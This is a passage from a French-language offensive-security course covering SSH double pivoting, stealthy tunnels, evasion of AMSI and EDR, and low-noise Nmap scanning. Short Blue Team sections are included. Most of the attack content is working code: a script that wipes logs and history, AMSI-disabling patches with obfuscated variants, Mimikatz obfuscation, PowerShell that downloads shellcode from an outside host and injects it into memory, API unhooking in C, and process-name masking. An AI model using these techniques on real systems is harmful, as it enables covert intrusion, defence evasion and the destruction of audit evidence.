    IdentityFile ~/.ssh/id_rsa

Host pivot-interne
    HostName 10.0.0.20
    User user
    ProxyJump pivot-externe
    IdentityFile ~/.ssh/id_rsa

Host serveur-web
    HostName 172.16.0.30
    User user
    ProxyJump pivot-interne
    IdentityFile ~/.ssh/id_rsa
EOF

# Connexion directe au serveur web (si SSH est disponible)
ssh serveur-web
```

6. **Accès au serveur web interne**

```bash
# Scan du serveur web via le double pivot
proxychains nmap -sT -Pn -p 80,443 172.16.0.30 -oN serveur_web_scan.txt

# Méthode 1: Port forwarding en chaîne
# Sur l'attaquant, tunnel vers le pivot interne
ssh -L 2222:10.0.0.20:22 user@192.168.0.10

# Puis tunnel du pivot interne vers le serveur web
ssh -L 8080:172.16.0.30:80 -p 2222 user@localhost

# Accès au serveur web via http://localhost:8080

# Méthode 2: Tunnel direct avec ProxyJump
ssh -L 8080:172.16.0.30:80 serveur-web

# Accès au serveur web via http://localhost:8080
```

7. **Techniques OPSEC pour réduire la détection**

```bash
# Utilisation de ports légitimes
ssh -D 443 user@192.168.0.10

# Limitation du trafic
ssh -o IPQoS=throughput user@192.168.0.10

# Tunnels temporaires avec timeout
timeout 1h ssh -D 1080 user@192.168.0.10

# Rotation des tunnels
cat > rotate_pivots.sh << 'EOF'
#!/bin/bash

# Configuration
PIVOT_EXTERNE="192.168.0.10"
PIVOT_INTERNE="10.0.0.20"
SERVEUR_WEB="172.16.0.30"
USER="user"

# Fonction pour créer un tunnel avec port aléatoire
create_tunnel() {
    local local_port=$((RANDOM % 10000 + 40000))
    echo "[+] Création d'un tunnel sur le port local $local_port"
    ssh -f -N -L $local_port:$SERVEUR_WEB:80 -J $USER@$PIVOT_EXTERNE,$USER@$PIVOT_INTERNE $USER@$SERVEUR_WEB
    echo $local_port
}

# Boucle principale
while true; do
    # Création d'un nouveau tunnel
    port=$(create_tunnel)
    pid=$(pgrep -f "ssh.*-L $port:")
    
    echo "[+] Tunnel actif sur le port $port (PID: $pid)"
    echo "[+] Utilisez http://localhost:$port pour accéder au serveur web"
    
    # Attente aléatoire entre 15 et 45 minutes
    sleep_time=$((RANDOM % 1800 + 900))
    echo "[+] Rotation dans $sleep_time secondes"
    sleep $sleep_time
    
    # Fermeture du tunnel actuel
    kill $pid
    
    # Pause aléatoire avant de créer un nouveau tunnel
    pause_time=$((RANDOM % 300 + 60))
    echo "[+] Pause de $pause_time secondes"
    sleep $pause_time
done
EOF

chmod +x rotate_pivots.sh
./rotate_pivots.sh &
```

8. **Nettoyage des traces**

```bash
# Sur l'attaquant
pkill -f "ssh.*-D"
pkill -f "ssh.*-L"

# Sur le pivot externe
ssh user@192.168.0.10 "last | grep -v 'still logged in' > last_backup; cat /dev/null > /var/log/wtmp; history -c"

# Sur le pivot interne
ssh -J user@192.168.0.10 user@10.0.0.20 "last | grep -v 'still logged in' > last_backup; cat /dev/null > /var/log/wtmp; history -c"
```

#### Vue Blue Team

Dans un environnement réel, cette approche de pivoting générerait des traces détectables :

1. **Logs générés**
   - Connexions SSH avec options de forwarding
   - Trafic chiffré entre segments réseau
   - Activités de scan après établissement des pivots

2. **Alertes potentielles**
   - Détection de tunnels SSH avec options de forwarding
   - Détection de trafic anormal entre segments réseau
   - Détection de connexions persistantes

3. **Contre-mesures possibles**
   - Surveillance des connexions SSH avec options de forwarding
   - Analyse du trafic entre segments réseau
   - Détection des anomalies de connexion (durée, volume)
   - Restrictions de routage entre segments réseau

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir établi un double pivot pour accéder à un serveur web interne
- Comprendre comment chaîner plusieurs tunnels SSH
- Être capable d'utiliser ProxyChains pour router le trafic à travers les pivots
- Apprécier l'importance des techniques OPSEC dans le pivoting
- Comprendre les traces générées par les activités de pivoting et comment les minimiser
# PARTIE II : PASSERELLE INTERMÉDIAIRE (+ OPSEC NIVEAU 2)

## Chapitre 10 : OPSEC Niveau 2 - Furtivité active

### Introduction : Pourquoi ce thème est important

L'OPSEC de niveau 2 représente une évolution significative par rapport aux techniques de base du niveau 1. Alors que l'OPSEC de niveau 1 se concentre sur l'hygiène numérique et la gestion des traces, le niveau 2 introduit des techniques de furtivité active pour réduire activement la détection pendant les opérations. Ces compétences sont essentielles pour les pentests avancés et les simulations d'attaques ciblées, où la simple discrétion ne suffit plus. Dans ce chapitre, nous explorerons des techniques comme le chiffrement TLS personnalisé, le contournement des solutions de sécurité modernes (AMSI/EDR), et l'optimisation du trafic réseau pour éviter la détection. Ces compétences vous permettront non seulement d'améliorer vos capacités offensives, mais aussi de comprendre comment les attaquants sophistiqués opèrent, renforçant ainsi votre capacité à les détecter et à les contrer.

### Chiffrement TLS personnalisé

Le chiffrement TLS standard est souvent surveillé par les solutions de sécurité modernes. La personnalisation du chiffrement TLS permet de réduire la détectabilité des communications tout en maintenant leur confidentialité.

#### Principes du chiffrement TLS

1. **Fonctionnement du TLS**
   - Établissement de la session (handshake)
   - Échange de clés et authentification
   - Chiffrement du canal de communication
   - Vérification d'intégrité des données

2. **Éléments personnalisables**
   - Suites de chiffrement (cipher suites)
   - Versions du protocole
   - Extensions TLS
   - Paramètres de la poignée de main (handshake)

3. **Signatures TLS détectables**
   - Empreintes JA3/JA3S
   - Caractéristiques du certificat
   - Ordre des extensions
   - Paramètres de négociation

#### Configuration de tunnels TLS avec Socat

Socat est un outil polyvalent qui permet de créer des tunnels TLS personnalisés.

1. **Génération de certificats**
   ```bash
   # Création d'un répertoire pour les certificats
   mkdir -p ~/certs
   cd ~/certs
   
   # Génération d'une autorité de certification (CA)
   openssl req -new -x509 -days 365 -nodes -out ca.crt -keyout ca.key \
     -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=Custom CA"
   
   # Génération d'une clé privée pour le serveur
   openssl genrsa -out server.key 2048
   
   # Création d'une demande de signature de certificat (CSR)
   openssl req -new -key server.key -out server.csr \
     -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=server.local"
   
   # Signature du certificat par la CA
   openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca.key \
     -set_serial 01 -out server.crt
   
   # Combinaison de la clé et du certificat pour Socat
   cat server.key server.crt > server.pem
   chmod 600 server.pem
   ```

2. **Création d'un tunnel TLS avec Socat**
   ```bash
   # Sur le serveur (machine pivot)
   socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,cipher=ECDHE-RSA-AES256-GCM-SHA384 TCP:localhost:22
   
   # Sur le client (machine attaquante)
   socat TCP-LISTEN:2222,reuseaddr,fork OPENSSL:server.local:8443,verify=0,cipher=ECDHE-RSA-AES256-GCM-SHA384
   
   # Connexion SSH via le tunnel TLS
   ssh -p 2222 user@localhost
   ```

3. **Personnalisation des paramètres TLS**
   ```bash
   # Utilisation de ciphers spécifiques
   socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,cipher=ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384 TCP:localhost:22
   
   # Spécification de la version TLS
   socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,method=TLS1.2 TCP:localhost:22
   
   # Combinaison de plusieurs paramètres
   socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,cipher=ECDHE-RSA-AES256-GCM-SHA384,method=TLS1.2 TCP:localhost:22
   ```

#### Tunnels TLS avec Stunnel

Stunnel est un outil spécialisé pour créer des tunnels TLS, offrant plus d'options de personnalisation que Socat.

1. **Installation de Stunnel**
   ```bash
   # Sur Debian/Ubuntu
   sudo apt update
   sudo apt install -y stunnel4
   
   # Sur RHEL/CentOS
   sudo yum install -y stunnel
   ```

2. **Configuration de base**
   ```bash
   # Sur le serveur (machine pivot)
   cat > /etc/stunnel/stunnel.conf << EOF
   ; Configuration Stunnel
   cert = /path/to/server.pem
   key = /path/to/server.key
   pid = /var/run/stunnel.pid
   output = /var/log/stunnel.log
   
   [ssh]
   accept = 8443
   connect = 127.0.0.1:22
   TIMEOUTclose = 0
   EOF
   
   # Démarrage de Stunnel
   stunnel /etc/stunnel/stunnel.conf
   
   # Sur le client (machine attaquante)
   cat > stunnel-client.conf << EOF
   ; Configuration Stunnel client
   client = yes
   pid = /tmp/stunnel-client.pid
   output = /tmp/stunnel-client.log
   
   [ssh]
   accept = 2222
   connect = server.local:8443
   TIMEOUTclose = 0
   EOF
   
   # Démarrage du client Stunnel
   stunnel stunnel-client.conf
   
   # Connexion SSH via le tunnel
   ssh -p 2222 user@localhost
   ```

3. **Personnalisation avancée**
   ```bash
   # Configuration avec ciphers personnalisés
   cat > /etc/stunnel/stunnel.conf << EOF
   ; Configuration Stunnel
   cert = /path/to/server.pem
   key = /path/to/server.key
   pid = /var/run/stunnel.pid
   output = /var/log/stunnel.log
   ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384
   sslVersion = TLSv1.2
   options = NO_SSLv2
   options = NO_SSLv3
   options = NO_TLSv1
   options = NO_TLSv1.1
   
   [ssh]
   accept = 8443
   connect = 127.0.0.1:22
   TIMEOUTclose = 0
   EOF
   ```

#### Mutual TLS Authentication (mTLS)

L'authentification mutuelle TLS ajoute une couche de sécurité supplémentaire en exigeant que le client s'authentifie également auprès du serveur.

1. **Génération de certificats client**
   ```bash
   # Génération d'une clé privée pour le client
   openssl genrsa -out client.key 2048
   
   # Création d'une demande de signature de certificat (CSR)
   openssl req -new -key client.key -out client.csr \
     -subj "/C=FR/ST=IDF/L=Paris/O=Security/OU=Pentest/CN=client.local"
   
   # Signature du certificat par la CA
   openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca.key \
     -set_serial 02 -out client.crt
   
   # Combinaison de la clé et du certificat pour Socat
   cat client.key client.crt > client.pem
   chmod 600 client.pem
   ```

2. **Configuration de mTLS avec Socat**
   ```bash
   # Sur le serveur (machine pivot)
   socat OPENSSL-LISTEN:8443,cert=server.pem,cafile=ca.crt,verify=1 TCP:localhost:22
   
   # Sur le client (machine attaquante)
   socat TCP-LISTEN:2222,reuseaddr,fork OPENSSL:server.local:8443,cert=client.pem,cafile=ca.crt,verify=1
   ```

3. **Configuration de mTLS avec Stunnel**
   ```bash
   # Sur le serveur (machine pivot)
   cat > /etc/stunnel/stunnel.conf << EOF
   ; Configuration Stunnel
   cert = /path/to/server.pem
   key = /path/to/server.key
   CAfile = /path/to/ca.crt
   verify = 2
   pid = /var/run/stunnel.pid
   output = /var/log/stunnel.log
   
   [ssh]
   accept = 8443
   connect = 127.0.0.1:22
   TIMEOUTclose = 0
   EOF
   
   # Sur le client (machine attaquante)
   cat > stunnel-client.conf << EOF
   ; Configuration Stunnel client
   client = yes
   cert = /path/to/client.pem
   key = /path/to/client.key
   CAfile = /path/to/ca.crt
   verify = 2
   pid = /tmp/stunnel-client.pid
   output = /tmp/stunnel-client.log
   
   [ssh]
   accept = 2222
   connect = server.local:8443
   TIMEOUTclose = 0
   EOF
   ```

### Bypass AMSI/EDR

Les solutions de sécurité modernes comme AMSI (Antimalware Scan Interface) et les EDR (Endpoint Detection and Response) représentent des obstacles majeurs pour les tests d'intrusion. Comprendre leur fonctionnement et les techniques de contournement est essentiel pour l'OPSEC de niveau 2.

#### Comprendre AMSI

AMSI est une interface Microsoft qui permet aux applications et services de s'intégrer avec les produits antimalware installés.

1. **Fonctionnement d'AMSI**
   - Interception des scripts et du code à l'exécution
   - Analyse du contenu avant exécution
   - Blocage du contenu malveillant détecté
   - Journalisation des détections

2. **Composants surveillés par AMSI**
   - PowerShell (scripts, commandes interactives)
   - JavaScript/VBScript (via Windows Script Host)
   - Office VBA Macros
   - .NET Framework

3. **Mécanismes de détection**
   - Signatures statiques
   - Analyse heuristique
   - Détection comportementale
   - Réputation

#### Techniques de contournement d'AMSI

1. **Modification de la mémoire**
   ```powershell
   # Technique de base (souvent détectée)
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   
   # Version obfusquée
   $a = 'System.Management.Automation.A';$b = 'ms';$c = 'iUtils'
   $assembly = [Ref].Assembly.GetType(('{0}{1}{2}' -f $a,$b,$c))
   $field = $assembly.GetField('amsiInitFailed','NonPublic,Static')
   $field.SetValue($null,$true)
   ```

2. **Contournement par fragmentation**
   ```powershell
   # Fragmentation du code malveillant
   $string1 = "Invoke-Mi"
   $string2 = "mikatz"
   $command = $string1 + $string2
   Invoke-Expression $command
   ```

3. **Utilisation de l'encodage**
   ```powershell
   # Encodage Base64
   $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Invoke-Mimikatz"))
   powershell -EncodedCommand $encodedCommand
   
   # Encodage avec compression
   $code = "Invoke-Mimikatz"
   $bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
   $compressed = [System.IO.Compression.GZipStream]::new([System.IO.MemoryStream]::new(), [System.IO.Compression.CompressionMode]::Compress)
   $compressed.Write($bytes, 0, $bytes.Length)
   $compressed.Close()
   $encoded = [Convert]::ToBase64String($compressed.ToArray())
   ```

4. **Techniques de réflexion**
   ```powershell
   # Chargement de DLL en mémoire
   $bytes = (Invoke-WebRequest "http://example.com/payload.dll" -UseBasicParsing).Content
   $assembly = [System.Reflection.Assembly]::Load($bytes)
   $entryPoint = $assembly.GetType("Namespace.Class").GetMethod("Method")
   $entryPoint.Invoke($null, $null)
   ```

#### Comprendre les EDR

Les EDR sont des solutions de sécurité avancées qui surveillent en continu les endpoints pour détecter et répondre aux menaces.

1. **Fonctionnement des EDR**
   - Collecte de données comportementales
   - Analyse en temps réel
   - Détection d'anomalies
   - Réponse automatisée

2. **Sources de données EDR**
   - Événements du système d'exploitation
   - Activités des processus
   - Connexions réseau
   - Modifications du registre et des fichiers
   - Chargement de modules

3. **Mécanismes de détection**
   - Signatures comportementales
   - Analyse de réputation
   - Machine learning
   - Corrélation d'événements

#### Techniques de contournement d'EDR

1. **Exécution sans processus (Process-less Execution)**
   ```powershell
   # Utilisation de techniques d'injection de thread
   # Exemple avec PowerShell et réflexion .NET
   $bytes = (Invoke-WebRequest "http://example.com/shellcode.bin" -UseBasicParsing).Content
   $buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll VirtualAlloc), (Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
   [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $buffer, $bytes.Length)
   $thread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll CreateThread), (Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $buffer, [IntPtr]::Zero, 0, [IntPtr]::Zero)
   [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-ProcAddress kernel32.dll WaitForSingleObject), (Get-DelegateType @([IntPtr], [Int32]) ([Int32]))).Invoke($thread, 0xFFFFFFFF)
   ```

2. **Utilisation d'outils légitimes (Living Off The Land)**
   ```powershell
   # Utilisation de MSBuild pour exécuter du code
   # Création d'un fichier XML malveillant
   $xml = @"
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        
        public class ClassExample : Task, ITask {
          public override bool Execute() {
            Console.WriteLine("Executed");
            System.Diagnostics.Process.Start("calc.exe");
            return true;
          }
        }
      </Code>
    </Task>
  </UsingTask>
</Project>
"@
$xml | Out-File -FilePath "build.xml"

# Exécution avec MSBuild
& 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe' build.xml
   ```

3. **Techniques d'évasion de hooks**
   ```c
   // Exemple en C pour contourner les hooks d'API
   #include <windows.h>
   #include <stdio.h>
   
   int main() {
       // Obtention de l'adresse de base de kernel32.dll
       HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
       
       // Recherche de l'adresse de CreateProcessA dans le disque
       char kernel32Path[MAX_PATH];
       GetSystemDirectoryA(kernel32Path, MAX_PATH);
       strcat_s(kernel32Path, MAX_PATH, "\\kernel32.dll");
       
       // Chargement d'une copie propre de kernel32.dll
       HMODULE hKernel32Clean = LoadLibraryA(kernel32Path);
       
       // Obtention de l'adresse de CreateProcessA dans la copie propre
       FARPROC pCreateProcessClean = GetProcAddress(hKernel32Clean, "CreateProcessA");
       
       // Utilisation de l'adresse propre pour appeler CreateProcessA
       typedef BOOL (WINAPI *CreateProcessA_t)(
           LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
           BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION
       );
       
       CreateProcessA_t CreateProcessA_clean = (CreateProcessA_t)pCreateProcessClean;
       
       STARTUPINFOA si = { sizeof(STARTUPINFOA) };
       PROCESS_INFORMATION pi;
       
       // Appel de la fonction propre
       CreateProcessA_clean(
           "C:\\Windows\\System32\\calc.exe",
           NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi
       );
       
       // Nettoyage
       CloseHandle(pi.hProcess);
       CloseHandle(pi.hThread);
       FreeLibrary(hKernel32Clean);
       
       return 0;
   }
   ```

4. **Techniques de masquage de processus**
   ```powershell
   # Exemple de masquage de processus avec PowerShell
   # Nécessite des privilèges élevés
   
   # Définition des structures et fonctions nécessaires
   $Kernel32 = @"
   using System;
   using System.Runtime.InteropServices;
   
   public class Kernel32 {
       [DllImport("kernel32.dll")]
       public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
       
       [DllImport("kernel32.dll")]
       public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
       
       [DllImport("kernel32.dll")]
       public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesRead);
       
       [DllImport("kernel32.dll")]
       public static extern bool CloseHandle(IntPtr hObject);
   }
   "@
   
   Add-Type $Kernel32
   
   # Obtention du PID du processus à masquer
   $processId = (Get-Process -Name "malicious").Id
   
   # Ouverture du processus
   $hProcess = [Kernel32]::OpenProcess(0x1F0FFF, $false, $processId)
   
   # Lecture de la structure PEB
   $pebAddress = 0x7FFE0000  # Adresse typique de la PEB
   $buffer = New-Object byte[] 4096
   [UIntPtr]$bytesRead = [UIntPtr]::Zero
   [Kernel32]::ReadProcessMemory($hProcess, [IntPtr]$pebAddress, $buffer, $buffer.Length, [ref]$bytesRead)
   
   # Modification du nom du processus dans la PEB
   # (Simplifié pour l'exemple - nécessiterait plus de détails en pratique)
   $newName = [System.Text.Encoding]::Unicode.GetBytes("explorer.exe`0")
   [UIntPtr]$bytesWritten = [UIntPtr]::Zero
   [Kernel32]::WriteProcessMemory($hProcess, [IntPtr]($pebAddress + 0x38), $newName, $newName.Length, [ref]$bytesWritten)
   
   # Fermeture du handle
   [Kernel32]::CloseHandle($hProcess)
   ```

### Traffic-shaping Nmap

Nmap est un outil puissant pour la découverte de réseau, mais son utilisation peut être facilement détectée. Le traffic-shaping permet de rendre les scans Nmap moins détectables.

#### Principes du traffic-shaping

1. **Problèmes des scans standard**
   - Volume élevé de paquets
   - Patterns de scan reconnaissables
   - Signatures de paquets identifiables
   - Timing prévisible

2. **Objectifs du traffic-shaping**
   - Réduction du volume de trafic
   - Modification des patterns de scan
   - Camouflage des signatures
   - Randomisation du timing

3. **Compromis à considérer**
   - Vitesse vs discrétion
   - Exhaustivité vs furtivité
   - Précision vs détectabilité

#### Techniques de timing Nmap

1. **Templates de timing prédéfinis**
   ```bash
   # T0 (Paranoïaque) - Extrêmement lent, très discret
   nmap -T0 192.168.1.0/24
   
   # T1 (Furtif) - Très lent, discret
   nmap -T1 192.168.1.0/24
   
   # T2 (Poli) - Lent, peu agressif
   nmap -T2 192.168.1.0/24
   
   # T3 (Normal) - Équilibré (défaut)
   nmap -T3 192.168.1.0/24
   
   # T4 (Agressif) - Rapide, potentiellement détectable
   nmap -T4 192.168.1.0/24
   
   # T5 (Insane) - Très rapide, très détectable
   nmap -T5 192.168.1.0/24
   ```

2. **Paramètres de timing avancés**
   ```bash
   # Délai entre les sondes (ms)
   nmap --scan-delay 500ms 192.168.1.0/24
   
   # Délai maximum entre les sondes (ms)
   nmap --max-scan-delay 1000ms 192.168.1.0/24
   
   # Taux de paquets par seconde
   nmap --min-rate 10 --max-rate 50 192.168.1.0/24
   
   # Parallélisme (nombre de sondes simultanées)
   nmap --min-parallelism 1 --max-parallelism 10 192.168.1.0/24
   
   # Timeout des sondes (ms)
   nmap --initial-rtt-timeout 500ms --max-rtt-timeout 1000ms 192.168.1.0/24
   
   # Combinaison de paramètres
   nmap --scan-delay 500ms --max-retries 1 --min-rate 10 --max-rate 50 192.168.1.0/24
   ```

#### Techniques de scan furtif

1. **Scans furtifs par défaut**
   ```bash
   # Scan SYN furtif (nécessite des privilèges root)
   sudo nmap -sS 192.168.1.0/24
   
   # Scan FIN
   sudo nmap -sF 192.168.1.0/24
   
   # Scan NULL
   sudo nmap -sN 192.168.1.0/24
   
   # Scan XMAS
   sudo nmap -sX 192.168.1.0/24
   
   # Scan ACK (détection de pare-feu)
   sudo nmap -sA 192.168.1.0/24
   ```

2. **Fragmentation et leurres**
   ```bash
   # Fragmentation des paquets
   sudo nmap -f 192.168.1.0/24
   
   # Fragmentation plus agressive
   sudo nmap -ff 192.168.1.0/24
   
   # Taille de MTU personnalisée (multiple de 8)
   sudo nmap --mtu 24 192.168.1.0/24
   
   # Scan avec leurres (adresses IP aléatoires)
   sudo nmap -D RND:10 192.168.1.0/24
   
   # Scan avec leurres spécifiques
   sudo nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.0/24
   
   # Adresse IP source spécifiée
   sudo nmap -S 10.0.0.1 192.168.1.0/24
   ```

3. **Manipulation des ports et de l'ordre de scan**
   ```bash
   # Scan de ports aléatoires
   nmap --randomize-hosts 192.168.1.0/24
   
   # Ordre de scan aléatoire
   nmap -r 192.168.1.0/24
   
   # Scan de ports spécifiques
   nmap -p 80,443,8080 192.168.1.0/24
   
   # Scan de ports dans un ordre aléatoire
   nmap -p 80,443,8080 --randomize-ports 192.168.1.0/24
   ```

#### Scans distribués et indirects

1. **Scan via proxy**
   ```bash
   # Utilisation de proxychains
   proxychains nmap -sT -Pn 192.168.1.0/24
   
   # Scan via un proxy SOCKS
   nmap --proxy socks4://proxy-server:1080 192.168.1.0/24
   
   # Scan via un proxy HTTP
   nmap --proxy http://proxy-server:3128 192.168.1.0/24
   ```

2. **Scan distribué**
   ```bash
   # Sur le serveur Nmap
   nmap --nsock-engine epoll -sS -p 80 --scan-delay 1s -oX scan.xml 192.168.1.0/24
   
   # Distribution manuelle du scan sur plusieurs machines
   # Machine 1
   nmap -sS -p 80 --scan-delay 1s 192.168.1.1-50
   # Machine 2
   nmap -sS -p 80 --scan-delay 1s 192.168.1.51-100
   # Machine 3
   nmap -sS -p 80 --scan-delay 1s 192.168.1.101-150
   # Machine 4
   nmap -sS -p 80 --scan-delay 1s 192.168.1.151-200
   ```

3. **Scan via rebond**
   ```bash
   # Scan FTP bounce (si le serveur FTP le permet)
   nmap -b username:password@ftp-server 192.168.1.0/24
   
   # Scan via un hôte zombie (Idle scan)
   sudo nmap -sI zombie-host:port 192.168.1.0/24
   ```

#### Script de scan Nmap OPSEC

Voici un exemple de script pour réaliser un scan Nmap discret :

```bash
#!/bin/bash
# opsec_nmap.sh - Scan Nmap discret avec techniques OPSEC

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target> [output_file] [intensity]"
    echo "Intensity: low, medium, high (default: medium)"
    exit 1
fi

TARGET=$1
OUTPUT_FILE=${2:-"scan_$(date +%Y%m%d_%H%M%S).xml"}
INTENSITY=${3:-"medium"}

# Vérification des privilèges root
if [ "$EUID" -ne 0 ]; then
    echo "[-] Ce script nécessite des privilèges root pour les scans furtifs."
    exit 1
fi

# Configuration selon l'intensité
case $INTENSITY in
    low)
        echo "[+] Mode furtif (très lent, très discret)"
        TIMING="-T1"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--scan-delay 1s --max-retries 1 -f --mtu 24 -D RND:5 --randomize-hosts"
        PORTS="--top-ports 20"
        ;;
    medium)
        echo "[+] Mode équilibré (lent, assez discret)"
        TIMING="-T2"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--scan-delay 500ms --max-retries 2 -f --randomize-hosts"
        PORTS="-p 21,22,23,25,53,80,88,110,111,135,139,143,389,443,445,465,587,636,1433,3306,3389,5432,5900,8080,8443"
        ;;
    high)
        echo "[+] Mode efficace (modéré, moins discret)"
        TIMING="-T3"
        SCAN_TYPE="-sS"
        EXTRA_OPTS="--min-rate 10 --max-rate 50 --randomize-hosts"
        PORTS="-p 1-1000,1433,3306,3389,5432,5900,8080,8443"
        ;;
    *)
        echo "[-] Intensité non reconnue: $INTENSITY"
        echo "[-] Valeurs supportées: low, medium, high"
        exit 1
        ;;
esac

# Fonction pour exécuter un scan avec délai aléatoire entre les phases
run_scan() {
    local phase=$1
    local scan_cmd=$2
    local output=$3
    
    echo "[*] Phase $phase: $scan_cmd"
    eval "$scan_cmd"
    
    # Délai aléatoire entre les phases
    if [ "$phase" -lt 3 ]; then
        local delay=$((RANDOM % 30 + 10))
        echo "[*] Pause de $delay secondes..."
        sleep $delay
    fi
}

# Phase 1: Découverte d'hôtes (ping sweep discret)
PING_SWEEP="nmap $TIMING -sn -PE -PP -PS21,22,23,25,80,443 -PA80,443 --disable-arp-ping $EXTRA_OPTS $TARGET -oG ping_sweep.txt"
run_scan 1 "$PING_SWEEP" "ping_sweep.txt"

# Extraction des hôtes actifs
ACTIVE_HOSTS=$(grep "Status: Up" ping_sweep.txt | cut -d " " -f 2)

if [ -z "$ACTIVE_HOSTS" ]; then
    echo "[-] Aucun hôte actif détecté. Tentative de scan sans découverte d'hôtes."
    ACTIVE_HOSTS=$TARGET
fi

# Phase 2: Scan de ports TCP furtif
TCP_SCAN="nmap $TIMING $SCAN_TYPE $PORTS $EXTRA_OPTS -Pn $ACTIVE_HOSTS -oA tcp_scan"
run_scan 2 "$TCP_SCAN" "tcp_scan.xml"

# Phase 3: Scan de version sur les ports ouverts (plus lent et plus discret)
OPEN_PORTS=$(grep "open" tcp_scan.gnmap | grep -oP '\d+/open' | cut -d "/" -f 1 | sort -u | tr '\n' ',' | sed 's/,$//')

if [ -n "$OPEN_PORTS" ]; then
    VERSION_SCAN="nmap $TIMING -sV --version-intensity 2 -p $OPEN_PORTS $EXTRA_OPTS -Pn $ACTIVE_HOSTS -oX $OUTPUT_FILE"
    run_scan 3 "$VERSION_SCAN" "$OUTPUT_FILE"
else
    echo "[-] Aucun port ouvert détecté."
    cp tcp_scan.xml "$OUTPUT_FILE"
fi

# Nettoyage des fichiers intermédiaires
rm -f ping_sweep.txt tcp_scan.*

echo "[+] Scan terminé. Résultats enregistrés dans $OUTPUT_FILE"

# Analyse des résultats
echo "[+] Résumé des résultats:"
grep -c "host " "$OUTPUT_FILE" | xargs echo "Hôtes scannés:"
grep -c "state=\"up\"" "$OUTPUT_FILE" | xargs echo "Hôtes actifs:"
grep -c "state=\"open\"" "$OUTPUT_FILE" | xargs echo "Ports ouverts:"

exit 0
```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les tunnels TLS personnalisés

1. **Logs réseau**
   - Connexions TLS sur des ports non standard
   - Certificats auto-signés ou émis par des CA non reconnues
   - Suites de chiffrement inhabituelles
   
   **Exemple de log Wireshark :**
   ```
   Frame 1234: 1500 bytes on wire, 1500 bytes captured
   Ethernet II, Src: 00:11:22:33:44:55, Dst: 66:77:88:99:aa:bb
   Internet Protocol Version 4, Src: 192.168.1.100, Dst: 10.0.0.1
   Transmission Control Protocol, Src Port: 54321, Dst Port: 8443
   Transport Layer Security
       TLSv1.2 Record Layer: Handshake Protocol: Client Hello
       Handshake Protocol: Client Hello
           Version: TLS 1.2
           Random: 01234567890abcdef...
           Cipher Suites (1 suite)
               Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030)
   ```

2. **Logs système**
   - Processus Socat ou Stunnel en cours d'exécution
   - Connexions persistantes sur des ports non standard
   - Génération et utilisation de certificats
   
   **Exemple de log système :**
   ```
   May 15 14:23:45 server stunnel[1234]: LOG5[1234:56789]: Connection from 192.168.1.100:54321
   May 15 14:23:45 server stunnel[1234]: LOG5[1234:56789]: TLS accepted: TLSv1.2 ECDHE-RSA-AES256-GCM-SHA384
   ```

3. **Logs d'application**
   - Erreurs de validation de certificat
   - Négociations TLS échouées
   - Connexions TLS inhabituelles
   
   **Exemple de log d'application :**
   ```
   [Wed May 15 14:23:45 2023] [warn] [client 192.168.1.100:54321] SSL library error 1 in handshake (server example.com:443)
   [Wed May 15 14:23:45 2023] [info] [client 192.168.1.100:54321] Connection closed to child 0 with abortive shutdown (server example.com:443)
   ```

#### Traces générées par les contournements d'AMSI/EDR

1. **Logs Windows Event**
   - Événements de désactivation ou de contournement d'AMSI
   - Chargement de modules en mémoire
   - Modifications de la mémoire des processus
   
   **Exemple d'événement Windows :**
   ```
   Event ID: 4688
   A new process has been created.
   Creator Process ID: 0x123
